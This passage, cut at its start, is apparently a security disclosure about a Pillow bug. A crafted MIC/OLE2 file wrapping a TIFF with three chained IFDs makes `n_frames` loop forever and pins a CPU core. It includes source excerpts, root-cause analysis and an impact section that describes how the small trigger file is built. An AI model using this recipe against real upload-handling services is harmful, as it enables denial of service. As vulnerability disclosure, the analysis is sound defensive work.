loop re-parses the same IFD forever. A 5632-byte OLE2 compound file whose `img0.ACI/Image` stream is a 351-byte TIFF with three chained 1×1 IFDs is enough. `Image.open()` on it succeeds (format `MIC`, detected by the OLE magic, no extension needed); evaluating `im.n_frames` then never returns and keeps one core at 100 %. A Python stack taken 27 s in is ``` File "src/PIL/TiffImagePlugin.py", line 1622 in _setup File "src/PIL/TiffImagePlugin.py", line 1271 in _seek File "src/PIL/TiffImagePlugin.py", line 1219 in n_frames ``` and instrumenting `_seek` shows it being called with `frame=1`, `tell()==0`, `_frame_pos==[8, 122]`, `_n_frames is None` on every iteration — identical state, so the loop is non-terminating, not merely slow. The same 351 TIFF bytes opened directly give `n_frames == 3` in milliseconds, and the same container around a 1-IFD TIFF gives `n_frames == 1`. The loop, `src/PIL/TiffImagePlugin.py:1212`: ```python @property def n_frames(self) -> int: current_n_frames = self._n_frames if current_n_frames is None: current = self.tell() self._seek(len(self._frame_pos)) while self._n_frames is None: self._seek(self.tell() + 1) # 1219 self.seek(current) ``` and the overrides that break its progress assumption, `src/PIL/MicImagePlugin.py:76`: ```python def seek(self, frame: int) -> None: … self.fp = self.ole.openstream(filename) TiffImagePlugin.TiffImageFile._open(self) # 82: resets _n_frames to None self.frame = frame def tell(self) -> int: return self.frame # 87: OLE stream index, not TIFF __frame ``` For a plain TIFF, `_seek(k)` (`TiffImagePlugin.py:1236`) loads IFDs up to `k`, appending each offset to `_frame_pos`, setting `_n_frames` when an IFD's next-pointer is 0 (or already seen), and setting the private `__frame = k`; `TiffImageFile.tell()` returns `__frame`, so `self.tell() + 1` walks the chain to its end. For a MIC file, `Image.open` → `MicImageFile._open` sets `self._n_frames = len(self.images)` at line 69, but then calls `self.seek(0)` → `TiffImageFile._open` (line 82), which unconditionally sets `self._n_frames = None` (`TiffImagePlugin.py:1203`) and `_seek(0)`s into the embedded stream. With the 3-IFD stream, IFD 0 has a non-zero next pointer, so `_n_frames` stays `None` after open. `n_frames` then runs: `current = self.tell()` is `0` (the OLE index); `_seek(len(_frame_pos))` = `_seek(1)` loads IFD 1, whose next pointer is also non-zero and not yet in `_frame_pos`, so `_n_frames` is still `None`. The `while` body computes `self.tell() + 1` = `0 + 1` and calls `_seek(1)` again; `len(_frame_pos)` is already 2, so nothing new is loaded — IFD 1 is re-read via `tag_v2.load` and `_setup()` and the state is unchanged. This repeats indefinitely; IFD 2 is never reached. Two chained IFDs are not enough (IFD 1's next pointer of 0 sets `_n_frames = 2` on the first `_seek(1)`); three or more are. `Tests/test_file_mic.py::test_n_frames` passes only because `hopper.mic`'s stream has a single IFD, so `_seek(0)` sets `_n_frames = 1` and the loop is never entered; the `len(self.images)` assignment at line 69 is only consumed by the initial `_seek_check(0)` and is overwritten before any caller can read `n_frames`. A side effect of the same mismatch: with a 2-IFD stream `n_frames` returns 2 (TIFF IFDs) while `seek(1)` indexes `self.images[1]` (OLE streams) and raises `IndexError` — visible with `save_all=True`. ## Impact Any application that lets Pillow open an uploaded file and then reads `im.n_frames` — the usual way to decide whether an image is animated (`getattr(im, "n_frames", 1) > 1`), and also what `hasattr(im, "n_frames")`/`getattr(im, "n_frames", 1)` in Pillow's own `TiffImagePlugin._save_all` (`:2333`), `PdfImagePlugin._save` (`:250`) and `WebPImagePlugin._save_all` (`:171`) evaluate when the app re-saves with `save_all=True` — can be made to spin one worker at 100 % CPU indefinitely with a 5.6 KB upload. The file needs no particular extension (OLE magic; `FpxImagePlugin` rejects it on CLSID and `MicImagePlugin` accepts it), default limits do not intervene, memory does not grow, and no exception is raised, so only an external watchdog ends it. Preconditions: `olefile` installed (it is an optional dependency; without it the MIC plugin is not registered) and the application touching `n_frames` or a `save_all` path. `Image.open()` itself, `load()`, `thumbnail()`, `convert()`, `is_animated` and `ImageSequence` iteration do not hang on this file.
